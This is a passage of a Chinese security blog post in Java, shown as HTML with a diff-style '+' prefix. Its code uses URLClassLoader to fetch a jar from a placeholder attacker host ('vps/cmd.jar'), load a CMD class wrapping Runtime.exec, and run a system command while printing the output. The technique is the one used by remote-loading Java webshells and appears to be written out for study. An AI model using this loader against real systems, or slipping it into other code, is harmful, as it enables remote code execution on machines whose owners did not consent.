class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.anbai.sec.classloader;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestURLClassLoader</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 定义远程加载的jar路径</span><br>            URL url = <span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;vps/cmd.jar&quot;</span>);<br><br>            <span class="hljs-comment">// 创建URLClassLoader对象，并加载远程jar包</span><br>            URLClassLoader ucl = <span class="hljs-keyword">new</span> URLClassLoader(<span class="hljs-keyword">new</span> URL[]&#123;url&#125;);<br><br>            <span class="hljs-comment">// 定义需要执行的系统命令</span><br>            String cmd = <span class="hljs-string">&quot;ls&quot;</span>;<br><br>            <span class="hljs-comment">// 通过URLClassLoader加载远程jar包中的CMD类</span><br>            Class cmdClass = ucl.loadClass(<span class="hljs-string">&quot;CMD&quot;</span>);<br><br>            <span class="hljs-comment">// 调用CMD类中的exec方法，等价于: Process process = CMD.exec(&quot;whoami&quot;);</span><br>            Process process = (Process) cmdClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(<span class="hljs-keyword">null</span>, cmd);<br><br>            <span class="hljs-comment">// 获取命令执行结果的输入流</span><br>            InputStream           in   = process.getInputStream();<br>            ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>            <span class="hljs-keyword">byte</span>[]                b    = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-keyword">int</span>                   a    = -<span class="hljs-number">1</span>;<br><br>            <span class="hljs-comment">// 读取命令执行结果</span><br>            <span class="hljs-keyword">while</span> ((a = in.read(b)) != -<span class="hljs-number">1</span>) &#123;<br>                baos.write(b, <span class="hljs-number">0</span>, a);<br>            &#125;<br><br>            <span class="hljs-comment">// 输出命令执行结果</span><br>            System.out.println(baos.toString());<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>编译为jar</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CMD</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Process <span class="hljs-title">exec</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        <span class="hljs-keyword">return</span> Runtime.getRuntime().exec(cmd);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/language/">language</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Java/">Java</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/03/24/CE&amp;Reflection/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CE&Reflection</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/02/19/%E6%9E%84%E5%BB%BA%E9%80%9A%E9%81%93%E6%BC%AB%E6%B8%B8%E5%86%85%E7%BD%91/">
+                        <span class="hidden-mobile">构建通道漫游内网</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"lCUF08cIQ1BPgn7X9fjMMTbe-MdYXbMMI","appKey":"RSMbcrKIFnecyMgNGc47g3tN","placeholder":"说点什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"requiredFields":[]},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          Fluid.plugins.initFancyBox('#valine .vcontent img:not(.vemoji)');
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="http://kIl3rr.github.io" target="_blank" rel="nofollow noopener"><span>kIl3rr</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+  
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script defer>
+      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
+      ga.l = +new Date;
+      ga('create', 'G-SL9T1KRBQY', 'auto');
+      ga('send', 'pageview');
+    </script>
+    <script async src='https://www.google-analytics.com/analytics.js'></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
